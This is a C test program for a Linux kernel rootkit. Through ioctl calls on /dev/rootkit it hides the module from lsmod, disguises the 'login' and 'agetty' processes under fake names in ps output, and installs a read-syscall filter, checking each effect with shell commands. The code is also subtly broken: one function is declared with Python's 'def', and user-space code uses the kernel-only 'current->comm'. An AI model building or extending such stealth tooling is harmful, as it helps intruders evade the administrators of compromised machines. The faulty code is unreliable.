#include "rootkit.h"
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>

const char *device = "/dev/rootkit";

void test_hide() {
  int fd = open(device, O_RDWR);
  if (fd < 0) {
    perror("open");
    return;
  }

  int ret = ioctl(fd, IOCTL_MOD_HIDE, 0);
  if (ret < 0) {
    perror("ioctl");
    return;
  }

  // checking lsmod output

  printf("first call should hide module...\n");
  system("lsmod");

  ret = ioctl(fd, IOCTL_MOD_HIDE, 0);
  if (ret < 0) {
    perror("ioctl");
    return;
  }

  // checking lsmod output
  printf("second call should unhide module...\n");
  system("lsmod");

  close(fd);
}

void test_masq() {
  int fd = open(device, O_RDWR);
  struct masq_proc_req req;
  req.len = 2;
  req.list = malloc(req.len * sizeof(struct masq_proc));
  strncpy(req.list[0].orig_name, "login", MASQ_LEN);
  strncpy(req.list[0].new_name, "felw", MASQ_LEN);
  strncpy(req.list[1].orig_name, "agetty", MASQ_LEN);
  strncpy(req.list[1].new_name, "shax", MASQ_LEN);

  printf("masquerading login and agetty processes... before\n");
  system("ps ao pid,comm");

  int ret = ioctl(fd, IOCTL_MOD_MASQ, &req);
  if (ret < 0) {
    perror("ioctl");
    return;
  }

  // checking lsmod output
  printf("call should masquerade processes...\n");
  system("ps ao pid,comm");

  free(req.list);
  close(fd);
}

def test_add_filter() {
  int fd = open(device, O_RDWR);
  struct filter_info info;

  info.syscall_nr = __NR_read;
  strncpy(info.comm, current->comm, TASK_COMM_LEN);
  info.comm[TASK_COMM_LEN - 1] = '\0';

  printf("adding filter for read syscall... before\n");
  system("strace -e read ls");

  int ret = ioctl(fd, IOCTL_ADD_FILTER, &info);
  if (ret < 0) {
    perror("ioctl");
    return;
  }

  printf("call should add filter for read syscall...\n");
  system("strace -e read ls");

  close(fd);
}

int main() {
  printf("Testing IOCTL_MOD_HIDE\n=====================\n");
  test_hide();

  printf("\nTesting IOCTL_MOD_MASQ\n=====================\n");
  test_masq();

  printf("\nTesting IOCTL_ADD_FILTER\n=====================\n");
  test_add_filter();
}
